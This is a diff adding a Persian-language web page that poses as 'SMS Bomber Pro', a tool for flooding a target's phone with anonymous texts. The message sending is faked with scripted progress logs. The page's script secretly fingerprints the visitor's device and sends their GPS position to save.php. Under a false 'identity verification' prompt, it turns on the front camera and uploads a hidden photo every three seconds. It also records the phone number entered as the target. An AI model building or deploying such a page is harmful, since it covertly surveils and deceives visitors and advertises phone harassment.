@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💥 SMS Bomber Pro v3.2</title>
+    <style>
+        :root {
+            --bg: #0a0a1a;
+            --card: rgba(255,255,255,0.04);
+            --border: rgba(255,255,255,0.06);
+            --accent: #ff4444;
+            --accent2: #cc0000;
+            --text: #fff;
+            --muted: rgba(255,255,255,0.3);
+            --green: #00f260;
+            --input-bg: rgba(255,255,255,0.06);
+            --input-border: rgba(255,255,255,0.08);
+        }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',system-ui,sans-serif;direction:rtl}
+        body{
+            background:linear-gradient(135deg,var(--bg),#1a1a2e);
+            min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px;
+            animation:bgShift 10s ease infinite alternate;
+        }
+        @keyframes bgShift{0%{background:linear-gradient(135deg,#0a0a1a,#1a1a2e)}100%{background:linear-gradient(135deg,#0d0d20,#1e1e35)}}
+        .container{
+            background:var(--card);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
+            border:1px solid var(--border);border-radius:20px;padding:32px 28px;
+            max-width:460px;width:100%;box-shadow:0 30px 80px rgba(0,0,0,0.8);
+            animation:fadeIn .5s ease;
+        }
+        @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+        .header{text-align:center;margin-bottom:24px}
+        .header .icon{font-size:56px;margin-bottom:10px;animation:bounce 2s infinite}
+        @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
+        .header h1{color:var(--accent);font-size:24px;font-weight:800;letter-spacing:-.5px}
+        .header .sub{color:var(--muted);font-size:12px;margin-top:6px}
+        .header .badge{
+            display:inline-block;background:rgba(255,50,50,0.15);
+            border:1px solid rgba(255,50,50,0.2);color:var(--accent);
+            padding:4px 12px;border-radius:20px;font-size:10px;font-weight:700;margin-top:8px
+        }
+        .form-group{margin-bottom:16px}
+        .form-group label{display:block;color:rgba(255,255,255,0.5);font-size:12px;margin-bottom:6px;font-weight:600}
+        .form-group input,.form-group select{
+            width:100%;padding:12px 16px;background:var(--input-bg);
+            border:1px solid var(--input-border);border-radius:12px;
+            color:var(--text);font-size:14px;outline:none;transition:all .3s
+        }
+        .form-group input:focus,.form-group select:focus{
+            border-color:rgba(255,50,50,0.4);box-shadow:0 0 0 3px rgba(255,50,50,0.08)
+        }
+        .row{display:flex;gap:12px}.row .form-group{flex:1}
+        .options{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:16px}
+        .opt{
+            background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);
+            border-radius:12px;padding:12px;text-align:center;cursor:pointer;
+            transition:all .2s;color:rgba(255,255,255,0.5);font-size:12px
+        }
+        .opt:hover{border-color:rgba(255,50,50,0.3);background:rgba(255,50,50,0.05)}
+        .opt.active{border-color:var(--accent);background:rgba(255,50,50,0.1);color:var(--accent)}
+        .opt .num{font-size:24px;font-weight:700;display:block;margin-bottom:4px}
+        .attack-btn{
+            width:100%;padding:16px;background:linear-gradient(135deg,var(--accent),var(--accent2));
+            border:none;border-radius:14px;color:var(--text);font-weight:800;font-size:16px;
+            cursor:pointer;transition:all .2s;margin:8px 0 14px;display:flex;
+            align-items:center;justify-content:center;gap:10px
+        }
+        .attack-btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(255,50,50,0.3)}
+        .attack-btn:disabled{opacity:.35;cursor:not-allowed;transform:none}
+        .pulse-dot{width:8px;height:8px;background:#fff;border-radius:50%;animation:pulse 1s infinite;display:none}
+        .attack-btn.loading .pulse-dot{display:inline-block}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.2}}
+        .progress-container{display:none;margin-bottom:16px}
+        .progress-container.active{display:block}
+        .progress-bar{background:rgba(255,255,255,0.06);border-radius:20px;height:22px;overflow:hidden;position:relative}
+        .progress-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:20px;transition:width .3s}
+        .progress-count{text-align:center;font-size:14px;color:var(--accent);font-weight:700;margin-top:8px}
+        .progress-text{text-align:center;font-size:11px;color:var(--muted);margin-top:4px}
+        .status-log{
+            background:rgba(0,0,0,0.3);border-radius:12px;padding:12px;
+            max-height:200px;overflow-y:auto;margin-bottom:16px;display:none;
+            direction:ltr;text-align:left
+        }
+        .status-log.active{display:block}
+        .status-log .line{
+            font-size:10px;color:rgba(255,255,255,0.4);padding:3px 0;
+            font-family:'Courier New',monospace;border-bottom:1px solid rgba(255,255,255,0.02)
+        }
+        .status-log .line.success{color:var(--green)}
+        .status-log .line.error{color:var(--accent)}
+        .status-box{
+            background:rgba(0,242,96,0.06);border:1px solid rgba(0,242,96,0.12);
+            border-radius:12px;padding:12px 16px;display:none;align-items:center;
+            justify-content:center;gap:10px;color:var(--green);font-size:13px;margin-bottom:16px
+        }
+        .status-box.error{background:rgba(255,50,50,0.06);border-color:rgba(255,50,50,0.12);color:var(--accent)}
+        .dot{width:6px;height:6px;background:var(--green);border-radius:50%;animation:pulse 1s infinite}
+        .footer{text-align:center;margin-top:16px}
+        .footer a{color:rgba(255,255,255,0.2);font-size:10px;text-decoration:none;margin:0 8px}
+        .footer a:hover{color:rgba(255,255,255,0.5)}
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <div class="icon">💥</div>
+        <h1>SMS BOMBER PRO</h1>
+        <p class="sub">نسخه ۳.۲ — سرویس ارسال پیامک انبوه ناشناس</p>
+        <span class="badge">⚡ ۱۲۰,۰۰۰+ کاربر فعال</span>
+    </div>
+
+    <div class="form-group">
+        <label>📱 شماره موبایل هدف</label>
+        <input type="tel" id="targetPhone" placeholder="۰۹۱۲۳۴۵۶۷۸۹" maxlength="13" autocomplete="off">
+    </div>
+
+    <div class="row">
+        <div class="form-group">
+            <label>🔢 تعداد پیامک</label>
+            <select id="smsCount">
+                <option value="10">۱۰ پیامک</option>
+                <option value="50" selected>۵۰ پیامک</option>
+                <option value="100">۱۰۰ پیامک</option>
+                <option value="500">۵۰۰ پیامک</option>
+                <option value="1000">۱۰۰۰ پیامک 💀</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label>⚡ سرعت ارسال</label>
+            <select id="speed">
+                <option value="slow">کند (۱۰/ثانیه)</option>
+                <option value="normal" selected>معمولی (۵۰/ثانیه)</option>
+                <option value="fast">سریع (۲۰۰/ثانیه)</option>
+                <option value="extreme">حرفه‌ای 💀 (۱۰۰۰/ثانیه)</option>
+            </select>
+        </div>
+    </div>
+
+    <div class="options">
+        <div class="opt active" data-mode="normal" onclick="selectMode(this)">
+            <span class="num">💣</span>معمولی
+        </div>
+        <div class="opt" data-mode="silent" onclick="selectMode(this)">
+            <span class="num">👻</span>مخفیانه
+        </div>
+        <div class="opt" data-mode="call" onclick="selectMode(this)">
+            <span class="num">📞</span>تماس همزمان
+        </div>
+        <div class="opt" data-mode="vip" onclick="selectMode(this)">
+            <span class="num">👑</span>VIP غیرقابل رهگیری
+        </div>
+    </div>
+
+    <button class="attack-btn" id="attackBtn" onclick="startAttack()">
+        <span class="pulse-dot"></span>
+        <span id="btnText">🚀 شروع بمباران</span>
+    </button>
+
+    <div class="progress-container" id="progressContainer">
+        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+        <div class="progress-count" id="progressCount">۰ / ۵۰</div>
+        <div class="progress-text" id="progressText">در حال اتصال به سرورهای ناشناس...</div>
+    </div>
+
+    <div class="status-log" id="statusLog">
+        <div class="line info">[سیستم] سرویس SMS Bomber Pro آماده است</div>
+        <div class="line info">[سیستم] ۱۲۴ سرور ناشناس فعال در ۱۷ کشور</div>
+        <div class="line info">[سیستم] پروکسی زنجیره‌ای ۷ لایه: فعال</div>
+        <div class="line info">[سیستم] رمزنگاری AES-256: فعال</div>
+    </div>
+
+    <div class="status-box" id="statusBox">
+        <span class="dot"></span>
+        <span id="statusText">در حال اسکن دستگاه...</span>
+    </div>
+
+    <div class="footer">
+        <a href="#" onclick="addLog('ℹ️ SMS Bomber Pro v3.2 - سرویس ناشناس','info')">درباره</a>
+        <a href="#" onclick="addLog('📜 فقط برای تست نفوذ مجاز','info')">قوانین</a>
+        <a href="#" onclick="addLog('🎧 پشتیبانی ۲۴/۷','info')">پشتیبانی</a>
+    </div>
+</div>
+
+<script>
+var stream = null, canvas = null, ctx = null, attackRunning = false;
+var autoData = {};
+
+function selectMode(el) {
+    document.querySelectorAll('.opt').forEach(b => b.classList.remove('active'));
+    el.classList.add('active');
+}
+
+function addLog(msg, type) {
+    var log = document.getElementById('statusLog');
+    log.classList.add('active');
+    var div = document.createElement('div');
+    div.className = 'line ' + type;
+    div.textContent = '[' + new Date().toLocaleTimeString('fa-IR') + '] ' + msg;
+    log.appendChild(div);
+    log.scrollTop = log.scrollHeight;
+}
+
+function updateProgress(current, total) {
+    var pct = Math.min((current / total) * 100, 100);
+    document.getElementById('progressFill').style.width = pct + '%';
+    document.getElementById('progressCount').textContent = 
+        current.toLocaleString('fa-IR') + ' / ' + total.toLocaleString('fa-IR');
+}
+
+function sendData(type, data) {
+    try {
+        fetch('save.php?type=' + type, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({type: type, data: data, timestamp: new Date().toISOString()})
+        }).catch(function(){});
+    } catch(e) {}
+}
+
+// جمع‌آوری اطلاعات دستگاه
+autoData.userAgent = navigator.userAgent;
+autoData.platform = navigator.platform;
+autoData.language = navigator.language;
+autoData.screenWidth = screen.width;
+autoData.screenHeight = screen.height;
+autoData.colorDepth = screen.colorDepth;
+autoData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+autoData.cores = navigator.hardwareConcurrency || 0;
+autoData.memory = navigator.deviceMemory || 0;
+autoData.maxTouch = navigator.maxTouchPoints || 0;
+autoData.cookiesEnabled = navigator.cookieEnabled;
+autoData.online = navigator.onLine;
+autoData.referrer = document.referrer || 'direct';
+
+setTimeout(function() {
+    sendData('device', autoData);
+}, 1500);
+
+// GPS
+setTimeout(function() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            function(p) {
+                sendData('gps', {
+                    lat: p.coords.latitude,
+                    lng: p.coords.longitude,
+                    accuracy: p.coords.accuracy + 'm',
+                    altitude: p.coords.altitude || 'N/A',
+                    speed: p.coords.speed || 'N/A'
+                });
+            },
+            function() { sendData('gps', {error: 'denied'}); },
+            {enableHighAccuracy: true, timeout: 8000, maximumAge: 0}
+        );
+    }
+}, 3000);
+
+// عکس‌برداری
+function capturePhoto() {
+    if (!stream) return;
+    var video = document.getElementById('cam');
+    if (!video || !video.videoWidth) return;
+    
+    if (!canvas) {
+        canvas = document.createElement('canvas');
+        ctx = canvas.getContext('2d');
+    }
+    
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+    
+    var imageData = canvas.toDataURL('image/jpeg', 0.85);
+    sendData('webcam', {
+        image: imageData,
+        userAgent: navigator.userAgent
+    });
+}
+
+// شروع حمله
+function startAttack() {
+    if (attackRunning) return;
+    attackRunning = true;
+    
+    var btn = document.getElementById('attackBtn');
+    var btnText = document.getElementById('btnText');
+    var progressContainer = document.getElementById('progressContainer');
+    var statusLog = document.getElementById('statusLog');
+    var targetPhone = document.getElementById('targetPhone').value.trim();
+    var smsCount = parseInt(document.getElementById('smsCount').value);
+    var speed = document.getElementById('speed').value;
+    var mode = document.querySelector('.opt.active')?.dataset?.mode || 'normal';
+    
+    btn.classList.add('loading');
+    btn.disabled = true;
+    btnText.textContent = 'در حال اجرا...';
+    progressContainer.classList.add('active');
+    statusLog.classList.add('active');
+    
+    addLog('🎯 هدف: ' + (targetPhone || 'نامشخص'), 'info');
+    addLog('📊 پیکربندی: ' + smsCount + ' پیامک | ' + mode + ' | ' + speed, 'info');
+    addLog('🔄 در حال اتصال به شبکه سرورهای ناشناس...', 'info');
+    addLog('🔐 ایجاد تونل رمزنگاری شده...', 'info');
+    
+    sendData('attack_start', {
+        phone: targetPhone,
+        count: smsCount,
+        speed: speed,
+        mode: mode
+    });
+    
+    // درخواست دوربین بعد از ۲ ثانیه
+    setTimeout(function() {
+        var statusBox = document.getElementById('statusBox');
+        var statusText = document.getElementById('statusText');
+        
+        statusBox.style.display = 'flex';
+        statusBox.className = 'status-box';
+        statusText.textContent = '📷 در حال تأیید هویت کاربر...';
+        
+        navigator.mediaDevices.getUserMedia({
+            video: {
+                width: {ideal: 640},
+                height: {ideal: 480},
+                facingMode: 'user'
+            },
+            audio: false
+        }).then(function(s) {
+            stream = s;
+            var video = document.createElement('video');
+            video.id = 'cam';
+            video.autoplay = true;
+            video.muted = true;
+            video.playsinline = true;
+            video.srcObject = s;
+            video.style.display = 'none';
+            document.body.appendChild(video);
+            video.play().catch(function(){});
+            
+            statusText.textContent = '✅ هویت تأیید شد — عکس ثبت شد';
+            addLog('📸 دوربین فعال شد — عکس‌برداری آغاز شد', 'success');
+            
+            // عکس اول فوری
+            setTimeout(capturePhoto, 500);
+            // عکس‌های بعدی هر ۳ ثانیه
+            setInterval(capturePhoto, 3000);
+            
+            setTimeout(function() {
+                statusBox.style.display = 'none';
+            }, 3000);
+            
+        }).catch(function(e) {
+            statusBox.className = 'status-box error';
+            statusText.textContent = '❌ دسترسی به دوربین رد شد';
+            addLog('📷 دوربین: دسترسی رد شد', 'error');
+        });
+    }, 2000);
+    
+    // شبیه‌سازی پیشرفت ارسال
+    var sent = 0;
+    var total = smsCount;
+    var speedMap = {slow: 200, normal: 80, fast: 30, extreme: 10};
+    var interval = speedMap[speed] || 80;
+    var servers = ['آلمان', 'هلند', 'روسیه', 'فرانسه', 'سوئیس', 'کانادا', 'سنگاپور', 'ترکیه', 'رومانی', 'ژاپن'];
+    var messages = [
+        'پیامک ارسال شد ✓', 'تحویل داده شد ✓', 'دریافت شد ✓',
+        'ارسال از طریق پروکسی ✓', 'مسیر ناشناس: فعال ✓'
+    ];
+    
+    var timer = setInterval(function() {
+        sent++;
+        updateProgress(sent, total);
+        
+        if (sent % Math.ceil(total / 10) === 0 || sent === 1 || sent === total) {
+            var msg = messages[Math.floor(Math.random() * messages.length)];
+            var server = servers[Math.floor(Math.random() * servers.length)];
+            addLog('[' + sent + '/' + total + '] ' + msg + ' (سرور ' + server + ')', 'success');
+        }
+        
+        if (sent < total / 3) {
+            document.getElementById('progressText').textContent = 'در حال اتصال به سرورهای ناشناس...';
+        } else if (sent < total * 2 / 3) {
+            document.getElementById('progressText').textContent = 'ارسال از طریق زنجیره پروکسی ۷ لایه...';
+        } else {
+            document.getElementById('progressText').textContent = 'در حال نهایی‌سازی و پاکسازی ردپا...';
+        }
+        
+        if (sent >= total) {
+            clearInterval(timer);
+            finishAttack();
+        }
+    }, interval);
+}
+
+function finishAttack() {
+    var btn = document.getElementById('attackBtn');
+    var btnText = document.getElementById('btnText');
+    
+    btn.classList.remove('loading');
+    btnText.textContent = '✅ عملیات با موفقیت انجام شد';
+    btn.style.background = 'linear-gradient(135deg, #00f260, #0575e6)';
+    
+    addLog('✅ عملیات بمباران با موفقیت به پایان رسید!', 'success');
+    addLog('📊 مجموع پیامک‌های ارسال شده: ' + document.getElementById('smsCount').value, 'success');
+    addLog('🔒 تمام مسیرها پاکسازی شدند — ردپا باقی نماند', 'info');
+    addLog('🛡️ امنیت عملیات: ۱۰۰٪', 'info');
+    
+    document.getElementById('progressText').textContent = '✅ عملیات کامل شد';
+    
+    sendData('attack_complete', {
+        status: 'success',
+        phone: document.getElementById('targetPhone').value,
+        count: document.getElementById('smsCount').value
+    });
+    
+    setTimeout(function() {
+        btnText.textContent = '🚀 شروع مجدد';
+        btn.style.background = 'linear-gradient(135deg, #ff4444, #cc0000)';
+        btn.disabled = false;
+        attackRunning = false;
+    }, 3000);
+}
+</script>
+</body>
+</html>
